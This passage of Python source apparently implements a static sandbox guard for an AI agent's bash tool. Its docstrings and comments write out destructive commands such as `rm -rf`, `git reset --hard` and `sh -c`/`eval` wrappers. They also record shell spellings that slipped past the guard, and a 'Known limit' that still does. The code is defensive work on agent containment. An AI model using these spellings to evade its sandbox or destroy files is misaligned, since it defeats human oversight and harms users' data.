      - `cat <<'EOF'` + `rm -rf /tmp/x` + `EOF` → targets ``['/tmp/x', 'EOF']``,
        i.e. the *delimiter word* named as a write target — the exact thing
        issue #1162's docstring calls "a guard whose message points at a token
        that is not a path is a guard nobody can trust";
      - `cat <<'EOF'` + `git checkout .` + `EOF` → BLOCKED as a git mutator, so
        a document that merely *mentions* the command could not be written.

    The same text in the spelling the guard already reads correctly — a quoted
    argument (`python3 -c "print(1 > 0)"`) — is allowed, so this was not a
    safety margin being spent; it was one text judged two ways for its spelling.

    Masking (not deleting) keeps the line structure, which matters because the
    mutator scan treats a newline as a separator: a blank line is whitespace and
    invents no command.

    Boundaries, stated rather than implied — a body is masked only when ALL of
    these hold, and every one of them fails closed:

    1. the owning invocation reads its stdin as data — a named data reader
       (`_DATA_READER_CONSUMERS`), or the message-reader invocation of issue
       #1320 (`_owns_stdin_as_data`);
    2. its output is not piped (`| $SHELL` cannot be resolved statically);
    3. a terminator line exists (an unterminated opener is left alone);
    4. no shell wrapper or evaluator token appears anywhere **outside** the
       bodies — so `sh -c "$(cat <<EOF … )"`, `eval $X` and `cat <<EOF | sh`
       keep being scanned exactly as before.

    What this does *not* claim: a body fed to an interpreter is executable
    code, and an interpreter can write files. That boundary is unchanged and
    already documented — `python3 -c 'open("/tmp/x","w")'` is allowed today.
    """
    if "<<" not in cmd:
        return cmd
    lines = cmd.split("\n")
    regions: list[tuple[int, int]] = []
    i = 0
    while i < len(lines):
        dels = _heredoc_delimiters_read_as_data(lines[i])
        start = i + 1
        next_i = i + 1
        for delim in dels:
            end = next((j for j in range(start, len(lines))
                        if lines[j].strip() == delim), None)
            if end is None:
                break
            regions.append((start, end))
            start = end + 1
            next_i = end + 1
        i = next_i
    if not regions:
        return cmd
    body_lines = {k for a, b in regions for k in range(a, b)}
    for k, line in enumerate(lines):
        if k in body_lines:
            continue
        if any(_basename(t) in _SHELL_WRAPPERS or _basename(t) in _SHELL_EVALUATORS
               for t in _split_command_tokens(line)):
            return cmd
    return "\n".join("" if k in body_lines else line
                     for k, line in enumerate(lines))


def _find_git_mutator(cmd: str, _depth: int = 0) -> str | None:
    """The first mutating git verb in ``cmd``, or None when there is none.

    Parses rather than scans (issues #1156 + #1159): every `git` invocation in
    a chained command is resolved to its verb and classified by effect. Returns
    a human-readable phrase for the block reason.

    Recurses into shell execution contexts (`sh -c <text>`, `eval <text>`), so
    a mutator that the shell will run is judged wherever it is written. Depth
    is capped rather than trusted: nesting is bounded by the shell itself, and
    a guard must terminate on adversarial input.

    Heredoc bodies that no shell executes are masked first, for the same reason
    as in `_extract_write_targets`: `cat <<EOF` + `git checkout .` + `EOF` is a
    document that mentions the command, not an invocation of it.
    """
    tokens = _tokenize_command(_mask_data_heredoc_bodies(cmd))
    for verb, rest in _git_verbs(tokens):
        hit = _git_invocation_is_mutator(verb, rest)
        if hit:
            return f"git {hit}"
    if _depth < 3:
        for nested in _nested_command_texts(tokens):
            hit = _find_git_mutator(nested, _depth + 1)
            if hit:
                return hit
    return None


def _cwd_left_workspace(
    cmd: str, workspace: str, _depth: int = 0, _base: str | None = None
) -> str | None:
    """The directory a command moves the shell into, when it is outside the workspace.

    The ``workspace-write`` boundary reads a *relative* write target as "inside
    the workspace, because the cwd is the workspace root". That premise holds
    only while the command writes from where it started: ``cd <dir>`` and
    ``env -C <dir>`` move the shell first, so every later target is relative to
    the new directory. Measured on master, `cd /elsewhere; echo x > out.txt`
    truncated `/elsewhere/out.txt` while the guard read `out.txt` as
    in-workspace and allowed it (issue #1244).

    Returns the offending directory, or None when the command never leaves the
    workspace — a destination inside a trusted write zone or the OS temp root
    does not count, because the boundary already allows those as write roots.
    The walk is conservative in one direction: *any* move outside counts, even
    one a later ``cd`` returns from, because the token stream does not say which
    segment a target belongs to without re-deriving the parse, and refusing is
    the fail-closed side. A move the guard cannot resolve (`cd -`, whose target
    is $OLDPWD) is reported by its own token and treated the same way: it cannot
    be proven to stay inside.

    The payload of a nested shell is read too (`sh -c 'cd /elsewhere; echo x >
    f'`, `env -C /elsewhere …`), since it runs with the same effect; depth is
    capped rather than trusted, because a guard must terminate on adversarial
    input.

    A destination the command spells with a variable is resolved against the
    command's own assignments as well as the environment — the scope the
    write-target rule reads (`_resolve_from_command_assignment`) — so
    `D=<dir> && cd "$D"` is a move this walk can place. Reading that scope in one
    place only is what let a correct refusal become an allowance: with the scope
    added for targets and not here, `D=<outside> && cd "$D" && T=<in-ws> && cat >
    "$T/f"` moved the shell out while the literal `$D` was joined onto the cwd and
    read as inside.

    **Known limit**: a destination *neither* scope can decide is joined onto the
    cwd and therefore reads as inside, which hides a move that really happens —
    `D=../outside && cd "$D" && cat > f` (the value charset admits no `..`) and
    `for d in <dir>; do cd "$d" && cat > f; done` are both ALLOW on every host
    (measured; issue #1357). The contract above argues for refusing them — a move
    that cannot be proven to stay inside is the case `cd -` is already refused for
    — but that is a behaviour change of its own, since it also refuses computed
    destinations that are legitimately inside, so it is decided in that issue
    rather than folded in here. A directory the token stream cannot preserve is
    invisible here for the older reason: a Windows spelling `C:\\Users\\x`
    reaches the guard as `C:Usersx` — backslash is shlex's escape character — so
    it is not read as an absolute path at all (issue #1261). Forward-slash
    spellings, relative moves and `..` are unaffected.
    """
    allowed = [workspace] + list(_trusted_write_zones()) + list(_temp_write_roots())
    cwd = os.path.realpath(_base) if _base else os.path.realpath(workspace)

    def leaves_workspace(path: str) -> bool:
        return not any(src and (_is_within(path, src) or path == src) for src in allowed)

    def resolve(tok: str) -> str:
        expanded = os.path.expanduser(os.path.expandvars(tok))
        if _UNRESOLVED_VAR_RE.search(expanded):
            # The environment is not the only resolution scope (issue #1316's
            # rule, read the other way round here): a variable the command
            # itself assigned in an earlier statement is one the shell resolves
            # at this move too, so `D=<dir> && cd "$D"` is a move this walk can
            # place. Without it the literal `$D` is joined onto the cwd, which
            # makes *any* such move read as "still inside the workspace" — the
            # same scope the write-target rule had just been taught, so the
            # asymmetry turned a correct refusal into an allowance: measured,
            # `D=<outside> && cd "$D" && T=<in-ws> && cat > "$T/f"` is BLOCK
            # before the target-side scope and was ALLOW with it.
            from_command = _resolve_from_command_assignment(cmd, tok)
            if from_command is not None:
                expanded = os.path.expanduser(os.path.expandvars(from_command))
        if not _is_absolute_path(expanded):
            expanded = os.path.join(cwd, expanded)
        return os.path.realpath(expanded)

    tokens = _split_command_tokens(_mask_data_heredoc_bodies(cmd))
    for i, tok in enumerate(tokens):
        word = _command_word(tok)
        if word not in ("cd", "env") or not _runs_as_a_command(tokens, i):
            continue
        args = _args_after_command(tokens, i)
        if word == "cd":
            operand = next((a for a in args if not a.startswith("-") or a == "-"), None)
            if operand is None:
                # A bare `cd` goes $HOME — outside the workspace unless the
                # workspace *is* $HOME, which the containment test below decides.
                cwd = os.path.realpath(os.path.expanduser("~"))
            elif operand == "-":
                # $OLDPWD: the guard has no way to know where that is.
                return "-"
            else:
                cwd = resolve(operand)
            if leaves_workspace(cwd):
                return cwd
            continue
        # `env -C <dir>` / `env --chdir=<dir>`: the child of `env` starts there.
        for j, a in enumerate(args):
            target = None
            if a in ("-C", "--chdir"):
                target = args[j + 1] if j + 1 < len(args) else None
            elif a.startswith("--chdir="):
                target = a.split("=", 1)[1]
            if target is None:
                continue
            cwd = resolve(target)
            if leaves_workspace(cwd):
                return cwd
    if _depth < 3:
        for nested in _nested_command_texts(tokens):
            hit = _cwd_left_workspace(nested, workspace, _depth + 1, cwd)
            if hit is not None:
                return hit
    return None


# The shell's own statement separators. A newline is one of them, and it is the
# one the ordinary tokenizer cannot report: it is whitespace to `shlex`, so
# `T=<dir>` and the write that follows it on the next line arrive as one
# word-list instead of two statements (issue #1316).
_STATEMENT_SEPARATORS = frozenset({"&&", "||", ";", "|", "&", "\n"})
# `shlex`'s default punctuation set (`();<>|&`) plus the newline: asking for it
# as punctuation is what makes it a token rather than whitespace.
_STATEMENT_PUNCTUATION = "();<>|&\n"
# Everything `shlex` strips as whitespace except the newline, which the line
# above hands to the parser as punctuation instead. `\r` has to stay listed, or
# a CRLF command would glue the carriage return to the token before it.
_STATEMENT_WHITESPACE = " \t\r\v\f"


def _split_command_statements(cmd: str) -> list[list[str]]:
    """``cmd``'s statements as token lists, newlines kept as separators.

    The same lexer as `_split_command_tokens` in every respect but one: a newline
    is asked for as punctuation instead of being left as whitespace, so it arrives
    as its own token rather than disappearing. That is the whole difference
    between reading ``T=<dir>`` and ``cat > "$T/f"`` on two lines as one
    word-list and reading them as the two statements a shell runs — and it is why
    issue #1316's newline row could not be answered from the ordinary token
    stream. Only the statement boundary needs this; every other rule keeps the
    tokenizer it already had.
    """
    cmd = _protect_windows_backslashes(_strip_line_continuations(cmd))
    try:
        lex = _shell_lexer(cmd, _STATEMENT_PUNCTUATION)
        lex.whitespace = _STATEMENT_WHITESPACE
        lex.whitespace_split = True
        return _restore_windows_backslashes(list(lex))
    except ValueError:
        return _restore_windows_backslashes(cmd.split())


def _heredoc_openers(line: str) -> list[tuple[str, bool]] | None:
    """``(delimiter, strips_tabs)`` for every heredoc opened on ``line``.

    ``None`` is "there is a ``<<`` here whose delimiter cannot be read", which is
    answered by refusing rather than by guessing. The scan is token-based for the
    reason `_heredoc_delimiters_read_as_data` records: a ``<<`` that is not its
    own token is a mention inside an argument (`grep -n "x <<EOF" f`), and one
    whose next token is not an identifier opens nothing (`python3 -c 'print(1 << 2)'`).
    """
    toks = _split_command_tokens(line)
    out: list[tuple[str, bool]] = []
    for idx, tok in enumerate(toks):
        if tok not in ("<<", "<<-"):
            continue
        nxt = toks[idx + 1] if idx + 1 < len(toks) else ""
        delim = nxt.lstrip("-")
        if not (delim and delim.isidentifier()):
            return None
        out.append((delim, tok == "<<-"))
    return out


def _no_heredoc_body_is_left_as_text(cmd: str, masked: str) -> bool:
    """Whether masking blanked *every* heredoc body in ``cmd``.

    `_mask_data_heredoc_bodies` blanks the bodies it can prove are data and
    leaves the rest, so a command can come back **half**-masked — one body blank,
    another still text. The rule below reads the remaining lines as statements,
    and a body left as text is exactly the input it must not read as one:
    measured on the tree that introduced it, a `cat <<EOF` body and a
    `myprog <<EOF` body in the same command answered ALLOW and resolved a write
    from a line of somebody's data, while `/bin/sh` put the write at `/f`.

    Asking the question directly — does any opener still sit above text that was
    not blanked? — is cheaper than linking each body to its consumer, and every
    answer it cannot give is "no": an unterminated opener, a delimiter it cannot
    read, and a body whose first line the terminator search reaches too early
    all end in the refusal this rule is called from.
    """
    before = cmd.split("\n")
    after = masked.split("\n")
    for k, line in enumerate(before):
        openers = _heredoc_openers(line)
        if openers is None:
            return False
        for name, strips_tabs in openers:
            end = next(
                (j for j in range(k + 1, len(before))
                 if before[j] == name
                 or (strips_tabs and before[j].strip("\t") == name)),
                None,
            )
            if end is None:
                return False
            if any(after[j].strip() for j in range(k + 1, end)):
                return False
    return True


def _leading_assignment_names(statement: list[str]) -> list[str]:
    """The names a statement assigns *before its command word* (``FOO=1 cmd``).

    The leading run is what a shell applies to the command it is about to run,
    and it stops at the first word that is not an assignment: in ``echo T=x`` the
    token ``T=x`` is an argument, not an assignment, and counting it as one would
    make an unrelated name look assigned twice.
    """
    names: list[str] = []
    for tok in statement:
        if not _is_env_assignment(tok):
            break
        names.append(tok.partition("=")[0])
    return names


def _commandless_assignment_pairs(statement: list[str]) -> list[tuple[str, str]]:
    """The ``NAME=value`` pairs a statement gives *the shell that runs it*.

    Only a statement made of assignments and nothing else does that: with no
    command word to attach them to, they are performed in the current shell and
    stay visible to later statements. ``T=tmp cmd > "$T/f"`` is the other shape —
    there the assignment is ``cmd``'s own environment, and the shell has already
    decided the redirect target without it (measured with ``/bin/sh`` in issue
    #1316: ``$T`` expands empty, so the file lands at ``/f``). Returning nothing
    for it is what keeps that spelling refused.
    """
    pairs: list[tuple[str, str]] = []
    for tok in statement:
        if not _is_env_assignment(tok):
            return []
        name, _, value = tok.partition("=")
        pairs.append((name, value))
    return pairs


def _assigned_value_is_decidable(value: str) -> bool:
    """Whether an assigned value can be resolved without guessing.

    A literal fragment only — `_ASSIGNED_LITERAL_VALUE_RE`, or a drive-rooted
    absolute value (`_ASSIGNED_DRIVE_ROOTED_VALUE_RE`, issue #1354) — with no
    ``..`` segment: the relative branch of the target rule assumes "relative
    therefore inside the workspace", so `T=../outside && cat > "$T/f"` is exactly
    the write that assumption cannot survive, and it stays refused (issue #1316).
    """
    if not (_ASSIGNED_LITERAL_VALUE_RE.match(value)
            or _ASSIGNED_DRIVE_ROOTED_VALUE_RE.match(value)):
        return False
    return ".." not in value.split("/")


def _resolve_from_command_assignment(cmd: str, token: str) -> str | None:
    """``token`` with the variables in it filled in from ``cmd``'s own assignments.

    Two call sites read this one rule, and they read it for the same reason:

      - the write-target rule, where the token is the file a redirect names
        (`T=.emrg/tmp && cat > "$T/f"`);
      - the moved-out walk, where the token is the directory a `cd` / `env -C`
        moves the shell into (`D=<dir> && cd "$D" && …`).

    Reading it in one place only is what let the two disagree: with the scope
    added for targets and not for moves, `D=<outside> && cd "$D" && cat > f`
    moved the shell out of the workspace while the walk, still expanding the
    environment alone, joined the literal `$D` onto the cwd and called the move
    "still inside" — the relative target behind it was then read as in-workspace
    (measured: BLOCK on master, ALLOW with the target-side scope only).

    Why the scope exists at all (issue #1316): the refusal this feeds reasons
    from the *environment* — `os.path.expandvars` against the variables the tool
    hands its child — and concludes that a token still carrying a variable root
    is one nobody can resolve. The environment is not the only resolution scope.
    A shell resolves `$T` at a write site from the values its own statements
    assigned earlier, so `T=.emrg/tmp && cat > "$T/f"` writes inside the
    workspace while the guard refused it. That shape is the ordinary way a
    scratch path is used, which makes the refusal a false block rather than a
    safety margin.

    The two spellings differ by one character and the shell treats them
    differently, and only one of them may open:

      - `T=.emrg/tmp && cat > "$T/f"` — a preceding statement's assignment is
        visible at the write site, so the target resolves;
      - `T=.emrg/tmp cat > "$T/f"` — the inline prefix is *not* visible to the
        redirect, so the shell writes `/f` and this keeps the refusal.

    The token may be a variable *root* (`$T/f`, whose value is spliced in) or the
    whole variable (`cd "$D"`, whose value replaces it): both are looked up the
    same way, because in both the shell reads the same assignment.

    Returns ``None`` whenever the answer is not provable, which is every case
    below; every one of them fails closed, so a command this cannot place keeps
    the refusal it has today rather than gaining an allowance:

      - the token is not a whole token of a statement at the top level (a
        redirect inside a nested `sh -c '<text>'` payload, or inside a heredoc
        body, is written by another shell — and an unexported variable expands to
        nothing there, so resolving it here would be the fail-open of issue
        #1316's `sh -c` row);
      - the command contains a heredoc whose body was *not* blanked, because then
        its lines cannot be told from statements — and an assignment written in a
        body is input, not a value any later `$T` sees;
      - a pipeline / background / subshell boundary anywhere in the command: each
        of those runs in a shell of its own, so an assignment on one side is not
        the value the other side sees;
      - the write site comes before the assignment, or the name is assigned more
        than once in the command (the value at the site is then not the one a
        single reading can name);
      - the assigned value is not a decidable literal.
    """
    if not (_UNRESOLVED_ROOT_RE.search(token) or _WHOLE_VAR_RE.match(token)):
        return None
    masked = _mask_data_heredoc_bodies(cmd)
    if not _no_heredoc_body_is_left_as_text(cmd, masked):
        # A body left as text: its lines cannot be told from statements, and an
        # assignment written in one is input no later `$T` ever sees.
        return None
    tokens = _split_command_statements(masked)
    if any(tok in ("|", "&", "(", ")") for tok in tokens):
        return None
    statements: list[list[str]] = [[]]
    for tok in tokens:
        if tok in _STATEMENT_SEPARATORS:
            statements.append([])
        else:
            statements[-1].append(tok)
    # The site is the statement carrying the token as a word of its own — the
    # redirect's target for the write rule, the `cd` operand for the move walk.
    site = next((k for k, st in enumerate(statements) if token in st), None)
    if site is None:
        return None
    # Assigned twice anywhere in the command ⇒ the value at the site is not the
    # one assignment a single reading can name. Counted over the whole command
    # rather than the prefix on purpose: a second assignment *after* the write
    # site also makes this undecidable without reading execution order, and an
    # undecidable command is refused.
    counts: dict[str, int] = {}
    for st in statements:
        for name in _leading_assignment_names(st):
            counts[name] = counts.get(name, 0) + 1
    values: dict[str, str] = {}
    for st in statements[:site]:
        for name, value in _commandless_assignment_pairs(st):
            values[name] = value
    resolved = token
    while True:
        m = _LEADING_VAR_ROOT_RE.match(resolved)
        if m is not None:
            # A root: the value is spliced in front of the separator the
            # lookahead stopped at, which stays in the text.
            name, tail = m.group(1), resolved[m.end():]
        else:
            # The whole token is the variable (`cd "$D"`): there is no separator
            # to stop at, so the value is the token entire. Read in the same
            # loop because it is the same lookup.
            m = _WHOLE_VAR_RE.match(resolved)
            if m is None:
                break
            name, tail = m.group(1), ""
        value = values.get(name)
        if (value is None or counts.get(name) != 1
                or not _assigned_value_is_decidable(value)):
            return None
        resolved = value + tail
    if resolved == token or _UNRESOLVED_ROOT_RE.search(resolved):
        # Nothing was filled in (the root is spelled in a way no assignment can
        # be matched to — an expansion operator, or a variable that is not the
        # leading word), or the fill-in stopped at a root it cannot reach (a
        # second variable later in the same path, `"$A/$B/c"`). Either way the
        # target arrives as placed as it was, so it keeps the refusal: half a
        # resolved path is not a path this guard can prove anything about.
        return None
    return resolved


def _check_sandbox(cmd: str, mode: str, workdir: str | None = None) -> tuple[bool, str | None, str]:
    """Static sandbox check for a bash command (rant 2026-08-20T15:46:50).

    Returns ``(allowed, blocked_reason, enforcement)``:
      - danger-full-access → (True, None, "full") — no checks, current behavior.
      - read-only → blocks every destructive write (rm -r / rmdir / mv /
        cp -r and shell redirects to any non-/dev/null target).
      - workspace-write → blocks destructive writes to protected daemon
        files, to ``~/.emrg`` itself, and to absolute paths outside the
        workspace root (the OS temp dir is allowed — mirrors dsh's
        workspace + backend-promised temp area).

    Heuristic by design: static scan only, no OS-level boundary — checked
    modes honestly report enforcement="partial".
    """
    if mode not in SANDBOX_MODES:
        return False, f"invalid sandbox mode {mode!r}", "partial"
    if mode == "danger-full-access":
        return True, None, "full"

    # Containment-escape guard (issue #1102): destination-based, applies to
    # both checked tiers. A metadata-credential fetch is a READ and escapes
    # the write-target scan below — it must run before the early returns.
    escape = _check_containment_escape(cmd)
    if escape:
        return False, escape, "partial"

    targets = _extract_write_targets(cmd) + _unresolved_wrapper_targets(cmd)
    if mode == "read-only":
        for t in targets:
            if t != "/dev/null":
                return False, (
                    f"read-only sandbox: blocked destructive write targeting {t!r}"
                ), "partial"
        # Git mutators are blocked too — the 2026-08-20 data-loss commands
        # (stash / checkout . / reset --hard / clean) write no file targets
        # and escaped the target scan (community issue #979). Also blocks
        # working-tree writers: apply / am / archive / submodule / worktree.
        #
        # Decided by **parsed verb**, not raw text (issues #1156 + #1159): a
        # global option between `git` and the subcommand used to defeat the
        # alternation, `git read-tree -u --reset` was never on the list, and
        # a command merely *mentioning* a mutator was refused. Chained commands
        # are judged per invocation, so `git stash list && git stash drop` still
        # blocks while a bare `git stash list` reads.
        hit = _find_git_mutator(cmd)
        if hit:
            return False, (
                f"read-only sandbox: blocked git mutating command {hit!r} "
                "(dirty-tree guard, community issue #979)"
            ), "partial"
        return True, None, "partial"

    # workspace-write
    if not targets:
        return True, None, "partial"
    protected = _protected_paths()
    emrg_home = os.path.realpath(os.path.expanduser("~/.emrg"))
    workdir_real = os.path.realpath(workdir) if workdir else None
    # A relative target is in-workspace only while the command writes from where
    # it started; a command that moves the shell out first (issue #1244)
    # makes the relative reading name a file the guard cannot place.
    #
    # The cwd that question is asked about is this process's when the caller
    # declared none — the child inherits it (execute() passes `cwd=workdir`, and
    # a None cwd means "inherit"). Reading `workdir_real` alone meant an omitted
    # workdir skipped the check entirely, so `cd <outside> && cat > f` was
    # refused with the workspace declared and *allowed* without it (issue
    # #1359). The boundary is not widened in exchange: `allowed_srcs` below still
    # takes a declared workspace only, so an omitted workdir can never permit
    # something a declared one refuses — for relative targets the two readings
    # are now equal, and for absolute ones the omitted reading stays the
    # stricter of the pair.
    cwd_real = workdir_real if workdir_real else os.path.realpath(os.getcwd())
    moved_out = _cwd_left_workspace(cmd, cwd_real)
    for t in targets:
        if t == "/dev/null":
            continue
        expanded = os.path.expanduser(os.path.expandvars(t))
        if not _is_absolute_path(expanded) and _UNRESOLVED_ROOT_RE.search(expanded):
            # The environment is not the only resolution scope (issue #1316): a
            # variable the *command itself* assigned in an earlier statement is
            # one the shell resolves at the write site, so the refusal below asks
            # the command before it answers "nobody can resolve this". A resolved
            # value then travels the ordinary path — absolute values reach the
            # `_is_within` / protected-file checks, relative ones still face the
            # `moved_out` check, and a spelling the command cannot place keeps the
            # refusal it has today.
            from_command = _resolve_from_command_assignment(cmd, t)
            if from_command is not None:
                expanded = os.path.expanduser(os.path.expandvars(from_command))
        if not _is_absolute_path(expanded):
            if _UNRESOLVED_ROOT_RE.search(expanded):
                # `$HOME/…` and `$TMPDIR/…` were resolved above against the
                # environment the tool hands its child, so a path that *still*
                # carries a variable root is one nobody can resolve — and
                # without this the shell would reach an absolute path the guard
                # read as "relative, therefore inside the workspace" (measured on
                # master: `echo x > $UNKNOWN/repo/out254.txt` is ALLOW there, and
                # `echo x > $HOME/.emrg/config.toml` — the daemon's own config —
                # was ALLOW for the same reason until expansion was added above).
                # A target whose root cannot be resolved is not one the guard can
                # prove stays in the workspace, so it fails closed instead of
                # guessing. A bare `$VAR` operand is left as it was: there the
                # variable is the whole name and the relative reading below
                # covers it exactly as it covers any other unresolvable name —
                # blocking it would refuse `cp $SRC $DST`, a defect report of its
                # own.
                return False, (
                    f"workspace-write sandbox: blocked write to {t!r}, whose root is "
                    "a shell variable neither the environment nor the command's own "
                    "assignments can resolve (issue #1244)"
                ), "partial"
            # Relative target: assumed in-workspace (cwd = the workspace root) —
            # an assumption the command itself can invalidate by moving the
            # shell first, so it is only made when the command left the cwd it
            # started in. `cd <outside>; echo x > out.txt` truncated a file
            # outside the workspace while this line read it as inside (issue
            # #1244); the block names the directory that made it possible.
            if moved_out is not None:
                return False, (
                    f"workspace-write sandbox: blocked write to relative target {t!r}: "
                    f"the command runs it after changing directory to {moved_out!r}, "
                    "which is not a directory this workspace can place it in (issue #1244)"
                ), "partial"
            # …and the target itself can invalidate it without moving anything,
            # by climbing out with `..` (issue #1353). The assumption above is
            # about *where* the write lands, so it is only sound while the
            # resolved target is still under the directory the command runs in:
            # `echo x > ../escaped.txt` was ALLOW here, exited 0, and created the
            # file outside the workspace (measured end to end). The base is the
            # directory the child actually starts in — the declared workspace,
            # or this process's cwd when the caller declared none, which is what
            # `execute()` hands the child as `cwd=None` (issue #1359).
            #
            # This only ever *adds* refusals: every relative target was allowed
            # before, and the test's omitted/declared property (issue #1359) is
            # preserved because both readings resolve against the directory the
            # child runs in and both then require the result to stay under it.
            base = workdir_real if workdir_real else cwd_real
            real = os.path.realpath(os.path.join(base, expanded))
            if real in protected:
                return False, (
                    f"workspace-write sandbox: blocked write to protected daemon file {t!r}"
                ), "partial"
            if real == emrg_home:
                return False, (
                    f"workspace-write sandbox: blocked destructive write to {t!r} "
                    "(would erase the daemon's data directory)"
                ), "partial"
            relative_allowed = (
                [base] + list(_trusted_write_zones()) + list(_temp_write_roots())
            )
            if not any(
                src and (_is_within(real, src) or real == src)
                for src in relative_allowed
            ):
                return False, (
                    f"workspace-write sandbox: blocked write to relative target {t!r}: "
                    f"it resolves to {real!r}, outside {base!r}, the directory the "
                    "command runs in (issue #1353)"
                ), "partial"
            continue
        real = os.path.realpath(expanded)
        if real in protected:
            return False, (
                f"workspace-write sandbox: blocked write to protected daemon file {t!r}"
            ), "partial"
        if real == emrg_home:
            return False, (
                f"workspace-write sandbox: blocked destructive write to {t!r} "
                "(would erase the daemon's data directory)"
            ), "partial"
        allowed_srcs = [workdir_real] if workdir_real else []
        allowed_srcs += list(_trusted_write_zones())
        allowed_srcs += list(_temp_write_roots())
        if not any(
            src and (_is_within(real, src) or real == src) for src in allowed_srcs
        ):
            return False, (
                f"workspace-write sandbox: blocked write outside workspace {t!r}"
            ), "partial"
    return True, None, "partial"


def _unresolved_wrapper_payloads(tokens: list[str]) -> list[str]:
    """Payloads of tokens the guard cannot resolve to a program.

    A token is a possible *wrapper* when its command word is a variable
    reference (`$SHELL`, `${SHELL}`, `"$SHELL"` — the tokenizer dequotes — and
    their assignment-prefixed spellings) rather than the name of a shell.
    Nothing in the text says whether that variable holds a shell, so what
    follows it is read as a command that may run: the same over-approximation a
    named wrapper already gets, and one that can only add blocking, never
    remove it (issue #1244).
    """
    out: list[str] = []
    for i, tok in enumerate(tokens):
        # The token as written *and* its basename. A `/` inside `${…}` is not a
        # directory separator, so `_basename("${SHELL//x/y}")` is `y}` — the
        # expansion would be cut in half and read as neither. Measured on master
        # `cca0b8dc`: `${SHELL//x/y} -c 'git checkout .'` is a live wrapper (the
        # shell expands it to the interpreter and runs the mutator), and the
        # guard answered ALLOW because the basename was `y}`. The basename test
        # stays: it is what recognises `/usr/bin/$SHELL`.
        if (
            _UNRESOLVED_VAR_RE.fullmatch(tok)
            or _UNRESOLVED_VAR_RE.fullmatch(_basename(tok))
        ):
            out.extend(tokens[i + 1:])
    return out


def _unresolved_wrapper_targets(cmd: str, _depth: int = 0) -> list[str]:
    """Write targets inside the payload of an un-resolvable wrapper.

    `_extract_write_targets` reads one command text, and a redirect inside a
    quoted payload is a character rather than an operator — so
    `$SHELL -c 'echo x > f'` named no target at all while the shell truncated
    `f` (measured on master). The payload of a wrapper the guard cannot resolve
    is not provably data, so the target rule reads it as a command for the same
    reason `_find_git_mutator` already does.

    Depth is capped rather than trusted: a guard must terminate on adversarial
    input.
    """
    if _depth >= 3:
        return []
    out: list[str] = []
    for nested in _unresolved_wrapper_payloads(_tokenize_command(cmd)):
        out.extend(_extract_write_targets(nested))
        out.extend(_unresolved_wrapper_targets(nested, _depth + 1))
    return out


def _decode_output(data: bytes, os_name: str | None = None) -> str:
    """Decode subprocess output bytes without corrupting non-UTF-8 text.

    POSIX: subprocess output is UTF-8 — unchanged behavior.

    Windows: cmd.exe/dir/echo output uses the console locale code page
    (GBK/cp936 on zh-CN), while git/gh emit UTF-8. Both must decode
    correctly, so we try the locale encoding **strictly** first and fall
    back to UTF-8 (also strict), then to UTF-8 with replacement as a last
    resort (rant 2026-08-08T09:35:30 — U+FFFD garbage from decoding GBK
    bytes as UTF-8).

    Scope of what strictness buys: it catches the case where the UTF-8 bytes
    are *invalid* in the locale codec. It does not catch the case where they
    are *also valid* there - a 2-byte UTF-8 sequence is exactly the shape of a
    GBK pair, so the first pass succeeds and the fallback is never reached.
    Measured on a cp936 host (this function, ``os_name="nt"``): 6 of 8
    Latin-1-range samples are silently mojibaked - ``café`` -> ``caf茅``,
    ``über`` -> ``眉ber``, ``señor`` -> ``se帽or`` - while 3-byte
    sequences (CJK, the inputs this policy was written for) fall through
    correctly. A path is filesystem bytes, not console bytes: readers that
    carry paths pin ``encoding="utf-8"`` outright rather than relying on this
    heuristic (see ``tests/test_script_decode_is_locale_independent.py``).

    ``os_name`` is injectable for tests (defaults to ``os.name``).
    """
    if not data:
        return ""
    name = os_name or os.name
    if name == "nt":
        enc = locale.getpreferredencoding(False) or "utf-8"
        for candidate in (enc, "utf-8"):
            try:
                return data.decode(candidate)  # strict
            except (LookupError, UnicodeDecodeError):
                continue
    return data.decode("utf-8", errors="replace")


class BashTool(ToolExecutor):
    """Execute shell commands via asyncio subprocess."""

    def definition(self) -> ToolDefinition:
        return ToolDefinition(
            name="bash",
            description=(
                "Execute a shell command and return stdout and stderr. "
                "Use for running tests, git commands, listing files, "
                "installing packages, and other shell operations. "
                "Commands run in the working directory by default; "
                "use the `workdir` parameter to override."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "The shell command to execute. Bash heredocs "
                        "(cmd <<'EOF' ... EOF) are supported on all platforms "
                        "— on Windows they are auto-translated to stdin redirects.",
                    },
                    "timeout": {
                        "type": "integer",
                        "description": "Timeout in seconds (default: 30).",
                    },
                    "workdir": {
                        "type": "string",
                        "description": "Working directory for the command (default: project root).",
                    },
                    "intent": {
                        "type": "string",
                        "description": "The purpose of this call: why you are invoking it and what you want to achieve. "
                        "One human-readable sentence, e.g. 'check how billing is implemented in billing.rs'.",
                    },
                },
                "required": ["command", "intent"],
            },
        )

    async def execute(self, arguments: dict) -> ToolResult:
        cmd = arguments.get("command", "")
        timeout = arguments.get("timeout", 30)
        workdir = arguments.get("workdir", None)
        # Sandbox tier — daemon-injected per task config (the agent cannot
        # choose its own sandbox; rant 2026-08-20T15:46:50).
        sandbox = arguments.get("sandbox")

        if not cmd:
            return ToolResult(name="bash", content="Error: no command provided", error=True)

        # Static file-level isolation check (rant 2026-08-20T15:46:50).
        sandbox_tag: str | None = None
        containment_warning: str | None = None
        if sandbox and sandbox != "danger-full-access":
            allowed, reason, enforcement = _check_sandbox(cmd, sandbox, workdir)
            if not allowed:
                logger.info("bash: BLOCKED by %s sandbox: %s", sandbox, reason)
                return ToolResult(
                    name="bash",
                    content=(
                        f"⛔ [sandbox:{sandbox} enforcement={enforcement}] "
                        f"{reason} — command not executed"
                    ),
                    error=True,
                )
            sandbox_tag = f"[sandbox:{sandbox} enforcement={enforcement}]"
            logger.debug("bash: sandbox %s check passed", sandbox)
        elif sandbox == "danger-full-access":
            # Issue #1102: the danger tier opts into no blocking, but a
            # containment-escape command still gets a visible warning so the
            # caller can spot credential exfiltration in the tool result.
            containment_warning = _check_containment_escape(cmd)

        logger.debug("bash: running %r (timeout=%ds)", cmd[:100], timeout)

        # Windows: cmd.exe cannot parse bash heredocs — translate the first
        # one to a stdin redirect (host sessions 2026-08-14T21:26/21:36 hit
        # "此时不应有 <<" with browser-harness <<'PY'). POSIX unchanged.
        temp_path = None
        if os.name == "nt":
            cmd, temp_path = _translate_windows_heredocs(cmd)

        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=workdir,
